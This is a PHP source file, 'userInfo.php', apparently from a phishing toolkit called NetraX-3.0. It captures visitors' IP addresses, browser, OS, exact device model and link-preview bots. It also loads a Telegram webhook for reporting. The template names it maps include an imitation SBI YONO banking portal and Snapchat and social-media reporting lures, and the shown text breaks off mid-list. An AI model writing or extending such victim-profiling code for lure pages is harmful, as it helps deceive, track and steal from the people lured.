<?php
/* ════════════════════════════════════════════════════════════════════
   userInfo.php --Visitor Detection & Logging Helper
   ─────────────────────────────────────────────────────────────────
   Reusable, production-ready module that captures accurate visitor
   info: IP (Cloudflare-compatible), Browser, OS, Device type.
   Returns a structured array, prints to terminal, and appends
   logs to the project's data/ folder.

   Created for NetraX-3.0
   GitHub: https://github.com/Garuda-Netra
   ────────────────────────────────────────────────────────────────
   Usage:
     require_once __DIR__ . '/userInfo.php';
     $visitor = captureVisitorInfo();   // returns associative array
   ════════════════════════════════════════════════════════════════════ */

/* ── Guard: prevent double-include ─────────────────────────────── */
if (defined('NETRAX_USERINFO_LOADED')) {
    return;
}
define('NETRAX_USERINFO_LOADED', true);

/* ── Telegram Webhook Integration ──────────────────────────────── */
if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
    require_once __DIR__ . '/telegram_webhook.php';
}

/* ══════════════════════════════════════════════════════════════════
   0.  TEMPLATE NAME RESOLUTION
   ══════════════════════════════════════════════════════════════════
   The shell script (netraX-3.0.sh) writes the selected template index
   to  data/.active_template  when the user picks a template.
   This section reads that file and maps the index to a human-
   readable name used in every visitor log entry.
   ══════════════════════════════════════════════════════════════════ */

/** Canonical template index → display-name mapping. */
define('NETRAX_TEMPLATES', [
    1 => "Season's Greetings",
    2 => 'YouTube Streaming',
    3 => 'Online Conference',
    4 => 'Social Media Reporting',
    5 => 'Banking Portal (SBI YONO)',
    6 => 'Social Media -- Snapchat',
]);

/**
 * Resolve the active template name.
 *
 * Reads data/.active_template (written by netraX-3.0.sh), validates the
 * index, and returns the matching display name.  Falls back to
 * 'NetraX-3.0' if the file is missing, empty, or contains an invalid value.
 *
 * @param  string|null $dataDir  Absolute path to the data/ directory.
 *                               Defaults to __DIR__/data.
 * @return string                Resolved template display name
 */
function resolveTemplateName(?string $dataDir = null): string
{
    static $cached = null;
    if ($cached !== null) {
        return $cached;
    }

    $dataDir  = $dataDir ?? (dirname(__FILE__, 2) . '/data');
    $flagFile = $dataDir . '/.active_template';

    if (is_file($flagFile) && is_readable($flagFile)) {
        $raw = trim(file_get_contents($flagFile));
        $idx = filter_var($raw, FILTER_VALIDATE_INT, [
            'options' => ['min_range' => 1, 'max_range' => max(array_keys(NETRAX_TEMPLATES))],
        ]);
        if ($idx !== false && isset(NETRAX_TEMPLATES[$idx])) {
            $cached = NETRAX_TEMPLATES[$idx];
            return $cached;
        }
    }

    /* Fallback --file missing, unreadable, or invalid */
    $cached = 'NetraX-3.0';
    return $cached;
}

/* ══════════════════════════════════════════════════════════════════
   1.  IP DETECTION  (Cloudflare-compatible, multi-header)
   ══════════════════════════════════════════════════════════════════ */

/**
 * Check if an IP address is private/reserved (non-routable).
 *
 * @param  string $ip  Validated IP address
 * @return bool        True if the IP is private/reserved
 */
function isPrivateIP(string $ip): bool
{
    return filter_var(
        $ip,
        FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
    ) === false;
}

/**
 * Detect the visitor's real public IP address(es).
 *
 * Headers checked (in priority order):
 *   1. HTTP_CF_CONNECTING_IP      Cloudflare edge → origin (most trusted)
 *   2. HTTP_TRUE_CLIENT_IP        Akamai / Cloudflare Enterprise
 *   3. HTTP_X_REAL_IP             nginx reverse proxy
 *   4. HTTP_CLIENT_IP             some load balancers
 *   5. HTTP_X_FORWARDED_FOR       proxy chain (all entries scanned)
 *   6. HTTP_FORWARDED             RFC 7239 standard header
 *   7. HTTP_X_CLUSTER_CLIENT_IP   Rackspace / some CDNs
 *   8. HTTP_CF_PSEUDO_IPV4        Cloudflare IPv4 pseudo-address for IPv6
 *   9. REMOTE_ADDR                direct connection fallback
 *
 * Every candidate is validated with filter_var(). Private IPs
 * are skipped when a public address is available.
 *
 * @return array ['ip'=>string, 'ip_version'=>string,
 *                'ipv4'=>string, 'ipv6'=>string, 'isp'=>string]
 */
function detectClientIP(): array
{
    $result = [
        'ip'         => 'unknown',
        'ip_version' => '',
        'ipv4'       => '',
        'ipv6'       => '',
        'isp'        => '',
    ];

    /* ── Ordered header list (most-trusted first) ─────────────── */
    $headerPriority = [
        'HTTP_CF_CONNECTING_IP',      // Cloudflare
        'HTTP_TRUE_CLIENT_IP',        // Akamai / CF Enterprise
        'HTTP_X_REAL_IP',             // nginx
        'HTTP_CLIENT_IP',             // load balancers
        'HTTP_X_CLUSTER_CLIENT_IP',   // Rackspace / CDNs
        'HTTP_CF_PSEUDO_IPV4',        // Cloudflare IPv4 pseudo
    ];

    $candidates = [];

    foreach ($headerPriority as $header) {
        if (!empty($_SERVER[$header])) {
            $candidates[] = trim($_SERVER[$header]);
        }
    }

    /* X-Forwarded-For may contain a comma-separated chain */
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        foreach (array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])) as $xff) {
            $candidates[] = $xff;
        }
    }

    /* RFC 7239 Forwarded header: "for=1.2.3.4" or "for="[::1]"" */
    if (!empty($_SERVER['HTTP_FORWARDED'])) {
        if (preg_match_all('/for=\"?\[?([0-9a-fA-F.:]+)\]?\"?/i',
                           $_SERVER['HTTP_FORWARDED'], $fwd)) {
            foreach ($fwd[1] as $ip) {
                $candidates[] = trim($ip);
            }
        }
    }

    /* Direct connection -- always append as last resort */
    $candidates[] = $_SERVER['REMOTE_ADDR'] ?? '';

    /* ── Scan candidates: separate public IPv4 and IPv6 ── */
    $primaryIP  = '';
    $publicIPv4 = '';
    $publicIPv6 = '';

    foreach ($candidates as $ip) {
        /* strip port if present (e.g. "1.2.3.4:8080") */
        if (strpos($ip, ':') !== false && strpos($ip, '.') !== false) {
            /* IPv4 with port */
            $ip = preg_replace('/:\d+$/', '', $ip) ?? $ip;
        }
        $ip = trim($ip, " \t[]");

        if ($ip === '' || !filter_var($ip, FILTER_VALIDATE_IP)) {
            continue;
        }

        $isPublic = !isPrivateIP($ip);

        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            if ($publicIPv4 === '' && $isPublic) {
                $publicIPv4 = $ip;
            }
        } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
            /* Normalize IPv6-mapped IPv4 (::ffff:1.2.3.4) */
            if (stripos($ip, '::ffff:') === 0) {
                $mapped = substr($ip, 7);
                if (filter_var($mapped, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                    if ($publicIPv4 === '' && !isPrivateIP($mapped)) {
                        $publicIPv4 = $mapped;
                    }
                    /* treat mapped address as IPv4 for primary selection */
                    if ($primaryIP === '' && !isPrivateIP($mapped)) {
                        $primaryIP = $mapped;
                    }
                    continue;
                }
            }
            if ($publicIPv6 === '' && $isPublic) {
                $publicIPv6 = $ip;
            }
        }

        if ($primaryIP === '' && $isPublic) {
            $primaryIP = $ip;
        }
    }

    /* ── Fallback: use first valid IP even if private ── */
    if ($primaryIP === '') {
        foreach ($candidates as $ip) {
            $ip = trim($ip, " \t[]");
            if ($ip !== '' && filter_var($ip, FILTER_VALIDATE_IP)) {
                $primaryIP = $ip;
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && $publicIPv4 === '') {
                    $publicIPv4 = $ip;
                } elseif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && $publicIPv6 === '') {
                    $publicIPv6 = $ip;
                }
                break;
            }
        }
    }

    $result['ip']         = $primaryIP ?: 'unknown';
    $result['ip_version'] = detectIPVersion($primaryIP ?: '');
    $result['ipv4']       = $publicIPv4;
    $result['ipv6']       = $publicIPv6;

    return $result;
}

/**
 * Determine IP version string.
 *
 * @param  string $ip  Validated IP address
 * @return string      'IPv4', 'IPv6', or ''
 */
function detectIPVersion(string $ip): string
{
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return 'IPv4';
    }
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        return 'IPv6';
    }
    return '';
}

/* ══════════════════════════════════════════════════════════════════
   2.  BROWSER DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Detect browser name and version from the User-Agent string.
 *
 * Detection order matters --e.g. Edge and Opera include "Chrome"
 * in their UA, so they must be checked first.
 *
 * @param  string $ua  Raw User-Agent header
 * @return array       ['browser' => string, 'browser_version' => string]
 */
function detectBrowser(string $ua): array
{
    $result = ['browser' => 'Unknown', 'browser_version' => ''];

    if (empty($ua)) {
        return $result;
    }

    /*
     * Patterns ordered by specificity (most-specific first).
     * Each entry: [regex_pattern, friendly_name]
     * The first capture group should yield the version number.
     */
    $patterns = [
        /* Edge (Chromium-based) must precede Chrome */
        ['#Edg(?:e|A|iOS)?/(\d+[\d.]*)#i',          'Edge'],
        /* Opera / OPR must precede Chrome */
        ['#(?:OPR|Opera)[/ ](\d+[\d.]*)#i',          'Opera'],
        /* Samsung Internet */
        ['#SamsungBrowser/(\d+[\d.]*)#i',             'Samsung Internet'],
        /* UCBrowser */
        ['#UCBrowser/(\d+[\d.]*)#i',                  'UC Browser'],
        /* Brave (identifies itself as Chrome but includes "Brave") */
        ['#Brave(?:/| )(\d+[\d.]*)#i',               'Brave'],
        /* Vivaldi */
        ['#Vivaldi/(\d+[\d.]*)#i',                    'Vivaldi'],
        /* Firefox (must precede generic checks) */
        ['#(?:Firefox|FxiOS)/(\d+[\d.]*)#i',         'Firefox'],
        /* Chrome / CriOS (after Edge, Opera, Samsung, Brave, Vivaldi) */
        ['#(?:Chrome|CriOS)/(\d+[\d.]*)#i',          'Chrome'],
        /* Safari --only if "Safari/" is present AND Chrome/Chromium is absent */
        ['#Version/(\d+[\d.]*).*Safari#i',            'Safari'],
        /* Internet Explorer */
        ['#(?:MSIE |Trident/.*rv:)(\d+[\d.]*)#i',    'Internet Explorer'],
    ];

    foreach ($patterns as [$regex, $name]) {
        if (preg_match($regex, $ua, $m)) {
            $result['browser']         = $name;
            $result['browser_version'] = $m[1] ?? '';
            return $result;
        }
    }

    return $result;
}

/* ══════════════════════════════════════════════════════════════════
   3.  OS DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Detect operating system from the User-Agent string.
 *
 * Returns human-readable names like "Windows 10", "macOS",
 * "Android 13", "iOS 17.2", "Linux".
 *
 * @param  string $ua  Raw User-Agent header
 * @return string      Readable OS name or 'Unknown'
 */
function detectOS(string $ua): string
{
    $osInfo = detectOSInfo($ua);
    return $osInfo['os'];
}

/**
 * Detect operating system and preserve a sanitized copy of raw UA.
 *
 * Structured format:
 * [
 *   'os' => 'Android 13',
 *   'raw_user_agent' => 'Mozilla/...'
 * ]
 *
 * @param  string $ua  Raw User-Agent header
 * @return array{os:string,raw_user_agent:string}
 */
function detectOSInfo(string $ua): array
{
    $uaSanitized = sanitizeUserAgent($ua);
    if ($uaSanitized === '') {
        return ['os' => 'Unknown', 'raw_user_agent' => ''];
    }

    /* ── iOS (must run before macOS checks) ───────────────────── */
    if (preg_match('#\b(?:iPhone|iPod|iPad)\b#i', $uaSanitized)) {
        if (
            preg_match('#\b(?:CPU(?: iPhone)? OS|iPhone OS)\s+([0-9_]+(?:\.[0-9]+)*)\b#i', $uaSanitized, $m)
            || preg_match('#\bOS\s+([0-9_]+)\s+like\s+Mac\s+OS\s+X\b#i', $uaSanitized, $m)
        ) {
            $version = normalizeUaVersion($m[1] ?? '');
            return [
                'os' => ($version !== '' ? 'iOS ' . $version : 'iOS'),
                'raw_user_agent' => $uaSanitized,
            ];
        }

        return ['os' => 'iOS', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Android ──────────────────────────────────────────────── */
    if (preg_match('#\bAndroid\s+([0-9]+(?:\.[0-9]+){0,2})\b#i', $uaSanitized, $m)) {
        $version = normalizeUaVersion($m[1] ?? '');
        
        /* Account for Chrome UA Reduction where Android version is frozen at 10 */
        if ($version === '10') {
            $hint = $_SERVER['HTTP_SEC_CH_UA_PLATFORM_VERSION'] ?? '';
            $hint = trim($hint, '" ');
            if ($hint !== '') {
                $version = explode('.', $hint)[0];
            } else {
                /* Let the user know the OS version might be hidden by the browser */
                $version = '10+ (API Reduced)';
            }
        }
        
        return [
            'os' => ($version !== '' ? 'Android ' . $version : 'Android'),
            'raw_user_agent' => $uaSanitized,
        ];
    }
    if (preg_match('#\bAndroid\b#i', $uaSanitized)) {
        return ['os' => 'Android', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Windows (NT version mapping) ─────────────────────────── */
    if (preg_match('#\bWindows\s+NT\s+([0-9]+(?:\.[0-9]+)?)\b#i', $uaSanitized, $m)) {
        return [
            'os' => 'Windows ' . mapWindowsVersion($m[1]),
            'raw_user_agent' => $uaSanitized,
        ];
    }
    if (preg_match('#\bWindows\b#i', $uaSanitized)) {
        return ['os' => 'Windows', 'raw_user_agent' => $uaSanitized];
    }

    /* ── macOS ────────────────────────────────────────────────── */
    if (preg_match('#\bMac\s+OS\s+X\s+([0-9_]+(?:\.[0-9_]+)*)\b#i', $uaSanitized, $m)) {
        $version = normalizeUaVersion($m[1] ?? '');
        return [
            'os' => ($version !== '' ? 'macOS ' . $version : 'macOS'),
            'raw_user_agent' => $uaSanitized,
        ];
    }
    if (preg_match('#\bMacintosh\b|\bMac\s+OS\b#i', $uaSanitized)) {
        return ['os' => 'macOS', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Chrome OS ────────────────────────────────────────────── */
    if (preg_match('#\bCrOS\b#i', $uaSanitized)) {
        return ['os' => 'Chrome OS', 'raw_user_agent' => $uaSanitized];
    }

    /* ── Linux (generic fallback) ─────────────────────────────── */
    if (preg_match('#\bLinux\b#i', $uaSanitized)) {
        return ['os' => 'Linux', 'raw_user_agent' => $uaSanitized];
    }

    return ['os' => 'Unknown', 'raw_user_agent' => $uaSanitized];
}

/**
 * Sanitize User-Agent value used by parsing routines.
 * Removes control chars and bounds length to avoid abuse.
 */
function sanitizeUserAgent(string $ua): string
{
    $ua = trim($ua);
    if ($ua === '') {
        return '';
    }

    $ua = preg_replace('/[\x00-\x1F\x7F]/u', '', $ua) ?? '';
    if ($ua === '') {
        return '';
    }

    return substr($ua, 0, 1024);
}

/**
 * Normalize extracted version tokens (e.g. 16_5 -> 16.5).
 */
function normalizeUaVersion(string $version): string
{
    $version = str_replace('_', '.', trim($version));
    $version = preg_replace('/[^0-9.]/', '', $version) ?? '';
    $version = preg_replace('/\.{2,}/', '.', $version) ?? '';
    return trim($version, '.');
}

/**
 * Map Windows NT kernel version to marketing name.
 *
 * @param  string $ntVersion  e.g. "10.0", "6.1"
 * @return string             e.g. "10", "7"
 */
function mapWindowsVersion(string $ntVersion): string
{
    /*
     * Windows 11 detection: NT 10.0 is shared by Win 10 & Win 11.
     * Modern browsers send Sec-CH-UA-Platform-Version to distinguish:
     *   Win 10 → platform version "10.0.x"  (major < 13)
     *   Win 11 → platform version "13.0.0"+ (major >= 13)
     */
    if ($ntVersion === '10.0') {
        $hint = $_SERVER['HTTP_SEC_CH_UA_PLATFORM_VERSION'] ?? '';
        /* Strip surrounding quotes that Chrome sends */
        $hint = trim($hint, '" ');
        if ($hint !== '') {
            $major = (int) explode('.', $hint)[0];
            if ($major >= 13) {
                return '11';
            }
            return '10';
        }
        return '10 / 11';   /* Can't distinguish without hint */
    }

    $map = [
        '6.3' => '8.1',
        '6.2' => '8',
        '6.1' => '7',
        '6.0' => 'Vista',
        '5.2' => 'XP x64',
        '5.1' => 'XP',
        '5.0' => '2000',
    ];
    return $map[$ntVersion] ?? $ntVersion;
}

/**
 * Map macOS version numbers to code names.
 *
 * @param  int $major  Major version (e.g. 10, 11, 12 …)
 * @param  int $minor  Minor version
 * @return string      Code name or empty string
 */
function mapMacOSVersion(int $major, int $minor): string
{
    /* macOS 11+ uses major version only */
    if ($major >= 11) {
        $names = [
            11 => '11 Big Sur',
            12 => '12 Monterey',
            13 => '13 Ventura',
            14 => '14 Sonoma',
            15 => '15 Sequoia',
        ];
        return $names[$major] ?? (string) $major;
    }
    /* macOS 10.x */
    $names10 = [
        15 => '10.15 Catalina',
        14 => '10.14 Mojave',
        13 => '10.13 High Sierra',
        12 => '10.12 Sierra',
        11 => '10.11 El Capitan',
        10 => '10.10 Yosemite',
        9  => '10.9 Mavericks',
    ];
    return $names10[$minor] ?? "10.{$minor}";
}

/* ══════════════════════════════════════════════════════════════════
   4.  DEVICE TYPE + EXACT MODEL DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Classify device as Mobile, Tablet, Smart TV, Console, or Desktop.
 *
 * @param  string $ua  Raw User-Agent header
 * @return string      'Mobile' | 'Tablet' | 'Smart TV' | 'Console' | 'Desktop' | 'Unknown'
 */
function detectDeviceType(string $ua): string
{
    if (empty($ua)) {
        return 'Unknown';
    }

    /* ── Smart TV ─────────────────────────────────────────────── */
    if (preg_match('#\b(SmartTV|SMART-TV|HbbTV|GoogleTV|AppleTV|Tizen|WebOS|BRAVIA|NetCast'
                 . '|Opera TV|Viera|PHILIPS-AVM|NETRANGEMMH|CE-HTML|MSTVDevice)\b#i', $ua)) {
        return 'Smart TV';
    }

    /* ── Game Console ─────────────────────────────────────────── */
    if (preg_match('#\b(PlayStation|Xbox|Nintendo|PSP|PS Vita|Wii[^a-z]|WiiU|3DS|Switch)\b#i', $ua)) {
        return 'Console';
    }

    /* ── Tablet (check before mobile -- tablets often include "Mobile") ── */
    if (preg_match('#\b(iPad|Tablet|PlayBook|Silk|Kindle|Fire|SM-T|GT-P|MediaPad'
                 . '|MatePad|Tab[_ ]|SAMSUNG.{0,10}Tab|Lenovo.*Tab|Xiaomi.*Pad'
                 . '|POCO.*Pad|Tab[0-9]|GT-N[0-9]|GT-P[0-9]|HUAWEI.*Tablet)\b#i', $ua)) {
        return 'Tablet';
    }

    /* ── Mobile ───────────────────────────────────────────────── */
    if (preg_match('#\b(Mobile|Android|iPhone|iPod|Opera Mini|Opera Mobi|IEMobile'
                 . '|Windows Phone|BlackBerry|BB10|webOS|Symbian|MIDP|MeeGo'
                 . '|Fennec|Minimo|Maemo|J2ME|KDDI|Nokia|SonyEricsson'
                 . '|SAMSUNG.{0,15}SM-[AGFN]|HTC|LG-|ZTE|Tecno|Infinix)\b#i', $ua)) {
        return 'Mobile';
    }

    return 'Desktop';
}


/**
 * detectDeviceModel()
 * --------------------
 * Returns the specific device model string, e.g.:
 *   "iPhone 15 Pro", "Samsung Galaxy S24", "Google Pixel 8",
 *   "OnePlus 12", "Xiaomi Redmi Note 13", "Huawei P60"
 *
 * Resolution order:
 *   1. Sec-CH-UA-Model   (client hint -- exact OEM model string)
 *   2. User-Agent regex  (pattern library)
 *   3. Generic fallback  (brand from UA, e.g. "Samsung Mobile")
 *
 * @param  string $ua  Raw User-Agent header
 * @return string      Detected model, or empty string if unknown
 */
function detectDeviceModel(string $ua): string
{
    /* ── 1. Sec-CH-UA-Model client hint (most accurate) ── */
    $hint = $_SERVER['HTTP_SEC_CH_UA_MODEL'] ?? '';
    $hint = trim($hint, '" ');
    if ($hint !== '' && $hint !== 'Unknown') {
        return $hint;  /* e.g. "Pixel 8", "SM-S928B" */
    }

    /* ── 2. UA-based model patterns ───────────────────── */
    $uaClean = sanitizeUserAgent($ua);
    if ($uaClean === '') {
        return '';
    }

    /* ── Apple iPhone model (map build identifiers) ── */
    if (preg_match('#iPhone#i', $uaClean)) {
        /* iPhones don't expose model in UA -- use screen hint if available */
        $screenW = (int) ($_SERVER['HTTP_DPR'] ?? 0);
        return 'iPhone';
    }

    /* ── Apple iPad ── */
    if (preg_match('#iPad#i', $uaClean)) {
        if (preg_match('#iPad\d+,\d+#', $uaClean, $m)) {
            return 'iPad (' . $m[0] . ')';
        }
        return 'iPad';
    }

    /* ── Apple iPod ── */
    if (preg_match('#iPod#i', $uaClean)) {
        return 'iPod touch';
    }

    /* ── Samsung Galaxy ── */
    if (preg_match('#(?:Samsung|SAMSUNG)[\s\-]?(SM-[A-Z0-9]+|Galaxy[\s\-][\w+]+)#i',
                   $uaClean, $m)) {
        $model = trim($m[1]);
        /* Convert SM codes to marketing names where possible */
        $smMap = [
            'SM-S928' => 'Galaxy S24 Ultra', 'SM-S921' => 'Galaxy S24',
            'SM-S926' => 'Galaxy S24+',      'SM-S918' => 'Galaxy S23 Ultra',
            'SM-S911' => 'Galaxy S23',        'SM-S916' => 'Galaxy S23+',
            'SM-S908' => 'Galaxy S22 Ultra',  'SM-S901' => 'Galaxy S22',
            'SM-A546' => 'Galaxy A54',        'SM-A536' => 'Galaxy A53',
            'SM-A325' => 'Galaxy A32',        'SM-A135' => 'Galaxy A13',
            'SM-M336' => 'Galaxy M33',        'SM-M526' => 'Galaxy M52',
            'SM-N970' => 'Galaxy Note 10',    'SM-N986' => 'Galaxy Note 20 Ultra',
            'SM-F946' => 'Galaxy Z Fold 5',   'SM-F731' => 'Galaxy Z Flip 5',
        ];
        foreach ($smMap as $prefix => $name) {
            if (stripos($model, $prefix) === 0) {
                return 'Samsung ' . $name;
            }
        }
        return 'Samsung ' . $model;
    }

    /* ── Google Pixel ── */
    if (preg_match('#(?:Pixel[\s\-]?([\w\s]+?))(?:[;)\s/]|$)#i', $uaClean, $m)) {
        return 'Google Pixel ' . trim($m[1]);
    }

    /* ── OnePlus ── */
    if (preg_match('#(?:OnePlus|OP)[\s\-]?([A-Z0-9\s]+?)(?:[;)\s/]|$)#i', $uaClean, $m)) {
        return 'OnePlus ' . trim($m[1]);
    }

    /* ── Xiaomi / POCO / Redmi ── */
    if (preg_match('#(?:Xiaomi|POCO|Redmi)[\s\-]?([\w\s]+?)(?:[;)\s/]|$)#i', $uaClean, $m)) {
        return trim($m[0]);
    }
    if (preg_match('#(?:M20[0-9]{2}[A-Z]+)#i', $uaClean, $m)) {
        return 'Xiaomi ' . $m[0];  /* Xiaomi build codes */
    }

    /* ── Huawei / Honor ── */
    if (preg_match('#(?:HUAWEI|Huawei|Honor)[\s\-]?([\w\-]+?)(?:[;)\s/]|$)#i', $uaClean, $m)) {
        return trim($m[0]);
    }

    /* ── Oppo / Realme / Vivo / iQOO ── */
    if (preg_match('#\b(RMX\d{4})\b#i', $uaClean, $m)) {
        return 'Realme (' . $m[1] . ')';
    }
    if (preg_match('#\b(CPH\d{4})\b#i', $uaClean, $m)) {
        return 'OnePlus / OPPO (' . $m[1] . ')';
    }
    if (preg_match('#\b(V\d{4}[A-Z]?|vivo[\s\-]?\w+)\b#i', $uaClean, $m)) {
        return 'Vivo (' . $m[1] . ')';
    }
    if (preg_match('#\b(I\d{4}|iQOO[\s\-]?\w+)\b#i', $uaClean, $m)) {
        return 'iQOO (' . $m[1] . ')';
    }
    if (preg_match('#(?:OPPO|Realme|Vivo)[\s\-]?([\w\s]+?)(?:[;)\s/]|$)#i', $uaClean, $m)) {
        return trim($m[0]);
    }

    /* ── Nothing Phone ── */
    if (preg_match('#\b(A063|A065|A142)\b#i', $uaClean, $m)) {
        $nMap = ['A063' => 'Nothing Phone (1)', 'A065' => 'Nothing Phone (2)', 'A142' => 'Nothing Phone (2a)'];
        return $nMap[$m[1]] ?? ('Nothing Phone (' . $m[1] . ')');
    }

    /* ── Motorola ── */
    if (preg_match('#\b(XT\d{4}(?:-\d)?)\b#i', $uaClean, $m)) {
        return 'Motorola (' . $m[1] . ')';
    }
    if (preg_match('#(?:Moto[\s\-G|\s\-E|\s\-Z|la])[\s\-]?([\w\s]+?)(?:[;)\s/]|$)#i',
                   $uaClean, $m)) {
        return trim($m[0]);
    }

    /* ── Nokia ── */
    if (preg_match('#Nokia[\s\-]?([\w]+)#i', $uaClean, $m)) {
        return 'Nokia ' . $m[1];
    }

    /* ── Generic Android brand from build string e.g. "; Tecno POP6 " ── */
    if (preg_match('#Android[^;]+;\s*([A-Za-z0-9][\w\s\-]+?)\s*(?:Build|\))#i', $uaClean, $m)) {
        $brand = trim($m[1]);
        /* Filter out noise like "wv" (WebView) or plain "Android" */
        if (strlen($brand) > 2 && !preg_match('#^(wv|Linux|Build|Mobile|Unknown)$#i', $brand)) {
            return $brand;
        }
    }

    /* ── Windows Phone ── */
    if (preg_match('#(?:Windows Phone[^;]+;\s*)(\S+)\b#i', $uaClean, $m)) {
        return 'Windows Phone -- ' . $m[1];
    }

    return '';  /* Unknown model */
}

/* ══════════════════════════════════════════════════════════════════
   5.  LINK SHARE & PREVIEW BOT DETECTION
   ══════════════════════════════════════════════════════════════════ */

/**
 * Detect if the incoming request is a link preview crawler / bot fetching
 * Open Graph metadata because a user just shared / pasted the link on a platform.
 *
 * @param  string $ua  Raw User-Agent
 * @param  string $ip  Client IP
 * @return array{is_preview: bool, platform: string, type: string, description: string, bot_name: string}
 */
function detectShareOrPreview(string $ua, string $ip = ''): array
{
    $res = [
        'is_preview'  => false,
        'platform'    => '',
        'type'        => '',
        'description' => '',
        'bot_name'    => '',
    ];

    if (empty($ua)) {
        return $res;
    }

    $uaClean = sanitizeUserAgent($ua);

    /* ── Ordered list of crawler / preview bot signatures ── */
    $bots = [
        // WhatsApp link preview bot / crawler
        [
            'pattern'     => '#\bWhatsApp(?:/[0-9.]+| [0-9.]+|\b)#i',
            'platform'    => 'WhatsApp',
            'type'        => 'Chat Link Preview',
            'description' => 'Link pasted/shared in WhatsApp Chat, Group, or Status',
            'bot'         => 'WhatsApp Link Previewer',
        ],
        // Telegram link preview bot
        [
            'pattern'     => '#\bTelegramBot\b|\bTelegram\b.*\b(bot|crawler|preview)\b#i',
            'platform'    => 'Telegram',
            'type'        => 'Chat Link Preview',
            'description' => 'Link pasted/shared in Telegram Chat, Channel, or Group',
            'bot'         => 'TelegramBot Preview Generator',
        ],
        // Google Messages / RCS / Android Text Messages link preview
        [
            'pattern'     => '#\b(Google-Read-Aloud|Google-PageRenderer|Google-InspectionTool|Google-Transparency-Report|Googlebot-Image|Google-Extended)\b#i',
            'platform'    => 'Google Messages (SMS/RCS)',
            'type'        => 'SMS / RCS Link Preview',
            'description' => 'Link shared via Text Message (Google Messages / RCS)',
            'bot'         => 'Google Messages Link Expander',
        ],
        // Android default SMS / MMS previewers
        [
            'pattern'     => '#\bAndroid.*(?:MMS|SMS|Messaging)\b#i',
            'platform'    => 'SMS / Text Message App',
            'type'        => 'SMS Link Preview',
            'description' => 'Link shared via Mobile SMS / Text Message',
            'bot'         => 'Android SMS Previewer',
        ],
        // Apple Messages / iMessage previewer
        [
            'pattern'     => '#\bApplebot\b|\bCFNetwork/.*Darwin.*Apple\b#i',
            'platform'    => 'iMessage / Apple Messages',
            'type'        => 'iMessage Link Preview',
            'description' => 'Link shared via iMessage / SMS on Apple device',
            'bot'         => 'Apple iMessage Link Previewer',
        ],
        // Samsung Messages / SMS
        [
            'pattern'     => '#\b(SamsungMessages|SecMessages|Samsung.*SMS)\b#i',
            'platform'    => 'Samsung Messages (SMS)',
            'type'        => 'SMS Link Preview',
            'description' => 'Link shared via Text Message on Samsung device',
            'bot'         => 'Samsung Messages Previewer',
        ],
        // Facebook / Messenger link preview
        [
            'pattern'     => '#\b(?:facebookexternalhit(?:/[0-9.]+)?|Facebot|facebookcatalog)\b#i',
            'platform'    => 'Facebook / Messenger',
            'type'        => 'Social Share / Chat Preview',
            'description' => 'Link shared on Facebook Post or Messenger Chat',
            'bot'         => 'Meta / Facebook Link Preview Engine',
        ],
        // Discord link preview embed
        [
            'pattern'     => '#\bDiscordbot\b#i',
            'platform'    => 'Discord',
            'type'        => 'Chat Embed Preview',
            'description' => 'Link pasted in Discord Server Channel or DM',
            'bot'         => 'Discord Embed Generator',
        ],
        // Twitter / X card preview
        [
            'pattern'     => '#\bTwitterbot\b#i',
            'platform'    => 'Twitter / X',
            'type'        => 'Tweet / DM Preview Card',
            'description' => 'Link shared in Tweet/Post or X Direct Message',
            'bot'         => 'Twitter Card Fetcher',
        ],
        // LinkedIn post / message preview
        [
            'pattern'     => '#\bLinkedInBot\b#i',
            'platform'    => 'LinkedIn',
            'type'        => 'Post / Message Preview',
            'description' => 'Link shared on LinkedIn Post or Direct Message',
            'bot'         => 'LinkedIn Open Graph Bot',
        ],
        // Snapchat preview
        [
            'pattern'     => '#\bSnapchat(?:Bot)?/|Snapchat(?:\s+Developer)?\b#i',
            'platform'    => 'Snapchat',
            'type'        => 'Snap / Story Preview',
            'description' => 'Link shared in Snapchat Chat or Story',
            'bot'         => 'Snapchat Link Previewer',
        ],
        // TikTok preview bot
        [
            'pattern'     => '#\b(?:Bytespider|TikTokBot|TikTok.*preview)\b#i',
            'platform'    => 'TikTok',
            'type'        => 'Video / Bio Preview',
            'description' => 'Link shared in TikTok DM, Comment, or Bio',
            'bot'         => 'TikTok Link Bot (ByteDance)',
        ],
        // Skype link preview
        [
            'pattern'     => '#\bSkypeUriPreview\b#i',
            'platform'    => 'Skype',
            'type'        => 'Chat Link Preview',
            'description' => 'Link shared in Skype Chat',
            'bot'         => 'Skype URI Previewer',
        ],
        // Slack unfurl bot
        [
            'pattern'     => '#\b(?:Slackbot-LinkExpanding|Slack-ImgProxy|Slackbot)\b#i',
            'platform'    => 'Slack',
            'type'        => 'Workspace Link Unfurl',
            'description' => 'Link posted in Slack Channel or DM',
            'bot'         => 'Slack Link Expanding Bot',
        ],
        // Signal messenger preview
        [
            'pattern'     => '#\bSignal(?:Bot)?\b#i',
            'platform'    => 'Signal Messenger',
            'type'        => 'Private Chat Link Preview',
            'description' => 'Link shared in Signal Private Chat',
            'bot'         => 'Signal Preview Proxy',
        ],
        // Viber link preview
        [
            'pattern'     => '#\bViber(?:Bot)?\b#i',
            'platform'    => 'Viber',
            'type'        => 'Chat Link Preview',
            'description' => 'Link shared in Viber Chat',
            'bot'         => 'Viber Link Previewer',
        ],
        // Line preview
        [
